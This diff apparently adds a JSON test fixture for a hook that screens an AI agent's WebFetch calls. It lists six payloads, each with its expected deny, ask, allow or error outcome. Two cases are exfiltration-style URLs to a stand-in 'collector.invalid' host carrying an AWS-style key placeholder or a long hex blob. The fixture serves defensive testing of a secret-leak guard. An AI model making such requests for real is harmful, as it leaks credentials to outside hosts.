@@ -1,0 +1,56 @@
+[
+  {
+    "id": "known-secret-path",
+    "payload": {
+      "hook_event_name": "PreToolUse",
+      "tool_name": "WebFetch",
+      "tool_input": {"url": "https://collector.invalid/path/AKIA0000000000000000"}
+    },
+    "expected_action": "deny"
+  },
+  {
+    "id": "ambiguous-query-value",
+    "payload": {
+      "hook_event_name": "PreToolUse",
+      "tool_name": "WebFetch",
+      "tool_input": {"url": "https://collector.invalid/?blob=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"}
+    },
+    "expected_action": "ask"
+  },
+  {
+    "id": "ordinary-url",
+    "payload": {
+      "hook_event_name": "PreToolUse",
+      "tool_name": "WebFetch",
+      "tool_input": {"url": "https://docs.invalid/guides/getting-started?lang=en"}
+    },
+    "expected_action": "allow"
+  },
+  {
+    "id": "missing-url",
+    "payload": {
+      "hook_event_name": "PreToolUse",
+      "tool_name": "WebFetch",
+      "tool_input": {}
+    },
+    "expected_action": "guard-error"
+  },
+  {
+    "id": "non-string-url",
+    "payload": {
+      "hook_event_name": "PreToolUse",
+      "tool_name": "WebFetch",
+      "tool_input": {"url": ["https://collector.invalid/"]}
+    },
+    "expected_action": "guard-error"
+  },
+  {
+    "id": "malformed-url",
+    "payload": {
+      "hook_event_name": "PreToolUse",
+      "tool_name": "WebFetch",
+      "tool_input": {"url": "https://collector.invalid/%ZZ"}
+    },
+    "expected_action": "guard-error"
+  }
+]
